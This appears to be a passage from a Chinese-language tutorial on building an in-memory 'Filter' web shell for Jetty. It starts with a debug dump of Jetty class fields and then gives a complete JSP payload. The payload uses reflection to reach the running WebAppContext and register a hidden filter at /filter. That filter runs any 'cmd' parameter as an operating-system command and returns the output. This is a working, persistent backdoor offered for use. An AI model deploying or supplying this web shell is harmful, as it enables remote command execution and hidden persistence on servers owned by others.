org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfClasses in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfJars in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfJarMap in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _classpathFiles in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _jettyEnvXml in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _overlays in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _quickStartWebXml in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _containerIncludeJarPattern in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _webInfIncludeJarPattern in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _baseAppFirst in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _isGenerateQuickStart in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: _preconfigProcessor in class: org.eclipse.jetty.maven.plugin.JettyWebAppContext Field: LOG in class: org.eclipse.jetty.webapp.WebAppContext Field: TEMPDIR in class: org.eclipse.jetty.webapp.WebAppContext Field: BASETEMPDIR in class: org.eclipse.jetty.webapp.WebAppContext Field: WEB_DEFAULTS_XML in class: org.eclipse.jetty.webapp.WebAppContext Field: ERROR_PAGE in class: org.eclipse.jetty.webapp.WebAppContext Field: SERVER_SYS_CLASSES in class: org.eclipse.jetty.webapp.WebAppContext Field: SERVER_SRV_CLASSES in class: org.eclipse.jetty.webapp.WebAppContext Field: __dftProtectedTargets in class: org.eclipse.jetty.webapp.WebAppContext Field: DEFAULT_CONFIGURATION_CLASSES in class: org.eclipse.jetty.webapp.WebAppContext Field: __dftSystemClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: __dftServerClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _configurationClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _systemClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _serverClasses in class: org.eclipse.jetty.webapp.WebAppContext Field: _configurations in class: org.eclipse.jetty.webapp.WebAppContext Field: _defaultsDescriptor in class: org.eclipse.jetty.webapp.WebAppContext Field: _descriptor in class: org.eclipse.jetty.webapp.WebAppContext Field: _overrideDescriptors in class: org.eclipse.jetty.webapp.WebAppContext Field: _distributable in class: org.eclipse.jetty.webapp.WebAppContext Field: _extractWAR in class: org.eclipse.jetty.webapp.WebAppContext Field: _copyDir in class: org.eclipse.jetty.webapp.WebAppContext Field: _copyWebInf in class: org.eclipse.jetty.webapp.WebAppContext Field: _logUrlOnStart in class: org.eclipse.jetty.webapp.WebAppContext Field: _parentLoaderPriority in class: org.eclipse.jetty.webapp.WebAppContext Field: _permissions in class: org.eclipse.jetty.webapp.WebAppContext Field: _contextWhiteList in class: org.eclipse.jetty.webapp.WebAppContext Field: _tmpDir in class: org.eclipse.jetty.webapp.WebAppContext Field: _persistTmpDir in class: org.eclipse.jetty.webapp.WebAppContext Field: _war in class: org.eclipse.jetty.webapp.WebAppContext Field: _extraClasspath in class: org.eclipse.jetty.webapp.WebAppContext Field: _unavailableException in class: org.eclipse.jetty.webapp.WebAppContext Field: _resourceAliases in class: org.eclipse.jetty.webapp.WebAppContext Field: _ownClassLoader in class: org.eclipse.jetty.webapp.WebAppContext Field: _configurationDiscovered in class: org.eclipse.jetty.webapp.WebAppContext Field: _allowDuplicateFragmentNames in class: org.eclipse.jetty.webapp.WebAppContext Field: _throwUnavailableOnStartupException in class: org.eclipse.jetty.webapp.WebAppContext Field: _metadata in class: org.eclipse.jetty.webapp.WebAppContext Field: SESSIONS in class: org.eclipse.jetty.servlet.ServletContextHandler Field: SECURITY in class: org.eclipse.jetty.servlet.ServletContextHandler Field: NO_SESSIONS in class: org.eclipse.jetty.servlet.ServletContextHandler Field: NO_SECURITY in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _decorators in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _defaultSecurityHandlerClass in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _sessionHandler in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _securityHandler in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _servletHandler in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _options in class: org.eclipse.jetty.servlet.ServletContextHandler Field: _jspConfig in class: org.eclipse.jetty.servlet.ServletContextHandler Field: SERVLET_MAJOR_VERSION in class: org.eclipse.jetty.server.handler.ContextHandler Field: SERVLET_MINOR_VERSION in class: org.eclipse.jetty.server.handler.ContextHandler Field: SERVLET_LISTENER_TYPES in class: org.eclipse.jetty.server.handler.ContextHandler Field: DEFAULT_LISTENER_TYPE_INDEX in class: org.eclipse.jetty.server.handler.ContextHandler Field: EXTENDED_LISTENER_TYPE_INDEX in class: org.eclipse.jetty.server.handler.ContextHandler Field: __unimplmented in class: org.eclipse.jetty.server.handler.ContextHandler Field: LOG in class: org.eclipse.jetty.server.handler.ContextHandler Field: __context in class: org.eclipse.jetty.server.handler.ContextHandler Field: MANAGED_ATTRIBUTES in class: org.eclipse.jetty.server.handler.ContextHandler Field: _scontext in class: org.eclipse.jetty.server.handler.ContextHandler Field: _attributes in class: org.eclipse.jetty.server.handler.ContextHandler Field: _initParams in class: org.eclipse.jetty.server.handler.ContextHandler Field: _classLoader in class: org.eclipse.jetty.server.handler.ContextHandler Field: _contextPath in class: org.eclipse.jetty.server.handler.ContextHandler Field: _displayName in class: org.eclipse.jetty.server.handler.ContextHandler Field: _baseResource in class: org.eclipse.jetty.server.handler.ContextHandler Field: _mimeTypes in class: org.eclipse.jetty.server.handler.ContextHandler Field: _localeEncodingMap in class: org.eclipse.jetty.server.handler.ContextHandler Field: _welcomeFiles in class: org.eclipse.jetty.server.handler.ContextHandler Field: _errorHandler in class: org.eclipse.jetty.server.handler.ContextHandler Field: _vhosts in class: org.eclipse.jetty.server.handler.ContextHandler Field: _logger in class: org.eclipse.jetty.server.handler.ContextHandler Field: _allowNullPathInfo in class: org.eclipse.jetty.server.handler.ContextHandler Field: _maxFormKeys in class: org.eclipse.jetty.server.handler.ContextHandler Field: _maxFormContentSize in class: org.eclipse.jetty.server.handler.ContextHandler Field: _compactPath in class: org.eclipse.jetty.server.handler.ContextHandler Field: _eventListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _programmaticListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _contextListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _contextAttributeListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _requestListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _requestAttributeListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _durableListeners in class: org.eclipse.jetty.server.handler.ContextHandler Field: _managedAttributes in class: org.eclipse.jetty.server.handler.ContextHandler Field: _protectedTargets in class: org.eclipse.jetty.server.handler.ContextHandler Field: _aliasChecks in class: org.eclipse.jetty.server.handler.ContextHandler Field: _availability in class: org.eclipse.jetty.server.handler.ContextHandler Field: __outerScope in class: org.eclipse.jetty.server.handler.ScopedHandler Field: _outerScope in class: org.eclipse.jetty.server.handler.ScopedHandler Field: _nextScope in class: org.eclipse.jetty.server.handler.ScopedHandler Field: _handler in class: org.eclipse.jetty.server.handler.HandlerWrapper Field: LOG in class: org.eclipse.jetty.server.handler.AbstractHandler Field: _server in class: org.eclipse.jetty.server.handler.AbstractHandler Field: LOG in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: _beans in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: _listeners in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: _doStarted in class: org.eclipse.jetty.util.component.ContainerLifeCycle Field: LOG in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STOPPED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: FAILED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STARTING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STARTED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: STOPPING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: RUNNING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _listeners in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _lock in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __FAILED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STOPPED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STARTING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STARTED in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: __STOPPING in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _state in class: org.eclipse.jetty.util.component.AbstractLifeCycle Field: _stopTimeout in class: org.eclipse.jetty.util.component.AbstractLifeCycle Error: _servletHandler
```

---

从打印的信息中可以看到，`_servletHandler` 字段实际上存在于 `org.eclipse.jetty.servlet.ServletContextHandler` 类中，而不是 `WebAppContext` 类中。因此，我们需要从 `WebAppContext` 类的父类 `ServletContextHandler` 中获取 `_servletHandler` 字段。

---

## 得到可用的 Filter 内存马



```jsp
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.io.*"%>

<%
    String filterName = "myFilter";
    String urlPattern = "/filter";
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                
                // 打印调试信息
                out.println("webAppContext class: " + webAppContext.getClass().getName() + "<br>");
                out.println("webAppContext superclass: " + webAppContext.getClass().getSuperclass().getName() + "<br>");
                
                try {
                    // 获取 _servletHandler 字段
                    Field fieldServletHandler = webAppContext.getClass().getSuperclass().getSuperclass().getDeclaredField("_servletHandler");
                    fieldServletHandler.setAccessible(true);
                    Object servletHandler = fieldServletHandler.get(webAppContext);
                    Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                    fieldFilters.setAccessible(true);
                    Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                    boolean flag = false;
                    for(Object f:filters){
                        Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                        fieldName.setAccessible(true);
                        String name = (String) fieldName.get(f);
                        if(name.equals(filterName)){
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        out.println("[-] Filter " + filterName + " exists.<br>");
                        return;
                    }
                    out.println("[+] Add Filter: " + filterName + "<br>");
                    out.println("[+] urlPattern: " + urlPattern + "<br>");
                    ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                    Class sourceClazz = null;
                    Object holder = null;
                    Field field = null;
                    try{
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                        field = sourceClazz.getDeclaredField("JAVAX_API");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, field.get(null));
                    }catch(ClassNotFoundException e){
                        sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                        Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                        holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                    }
                    holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
                    holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                    servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

                    Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                    Object filterMapping = clazz.newInstance();
                    Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                    method.setAccessible(true);
                    method.invoke(filterMapping, holder);
                    filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                    filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                    servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);
                } catch (NoSuchFieldException e) {
                    out.println("Error: " + e.getMessage() + "<br>");
                }
            }     
        }
    }
%>
```

在这段代码中，我们通过 `webAppContext.getClass().getSuperclass().getSuperclass()` 获取 `ServletContextHandler` 类，然后获取 `_servletHandler` 字段。这样可以确保我们正确地获取到 `ServletContextHandler` 类中的 `_servletHandler` 字段。

---

